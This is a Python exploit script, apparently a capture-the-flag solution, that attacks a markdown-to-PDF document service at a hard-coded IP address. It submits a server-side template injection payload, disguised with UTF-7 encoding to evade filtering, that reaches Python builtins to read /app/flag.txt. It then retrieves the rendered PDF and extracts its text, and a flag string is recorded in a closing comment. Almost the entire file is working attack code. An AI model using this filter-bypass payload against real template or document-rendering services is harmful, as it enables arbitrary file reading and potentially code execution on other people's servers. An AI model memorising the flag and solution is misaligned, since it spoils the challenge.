import requests
import time
import sys

TARGET = "http://16.184.29.216"

def exploit():

    payload = "+AHs-+AHs- self.__init__.__globals__.__builtins__.open('/app/flag.txt').read() +AH0-+AH0-"

    create_url = f"{TARGET}/api/documents"
    document_data = {
        "title": "Ex",
        "markdown_content": payload
    }
    
    response = requests.post(create_url, json=document_data)
    response.raise_for_status()
    result = response.json()
        
    document_id = result.get("document_id")
    session_cookie = response.cookies.get("session_id")
    if session_cookie:
        print(f"[+] Session ID: {session_cookie}")
        

    
    status_url = f"{TARGET}/api/documents/{document_id}"
    cookies = {"session_id": session_cookie} if session_cookie else {}
    
    max_attempts = 20
    for i in range(max_attempts):
        try:
            time.sleep(1)
            response = requests.get(status_url, cookies=cookies)
            status_data = response.json()
            status = status_data.get("status")
            
            print(f"[*] Attempt {i+1}/{max_attempts}: Status = {status}")
            
            if status == "completed":
                break
            elif status == "failed":
                return
                
        except Exception as e:
            print(f"{e}")
    
    if status != "completed":
        return
    
    preview_url = f"{TARGET}/api/documents/{document_id}/preview"
    
    
    response = requests.get(preview_url, cookies=cookies)
    response.raise_for_status()

    pdf_filename = f"{document_id}.pdf"
    with open(pdf_filename, "wb") as f:
            f.write(response.content)

    
    import PyPDF2
    with open(pdf_filename, "rb") as f:
        pdf_reader = PyPDF2.PdfReader(f)
        text = ""
        for page in pdf_reader.pages:
            text += page.extract_text()
if __name__ == "__main__":
    exploit()


# flag : whitehat2025{a1c56e0f04fb9abc8467c89089703c8c224d56bc007344b37101f6abe3}
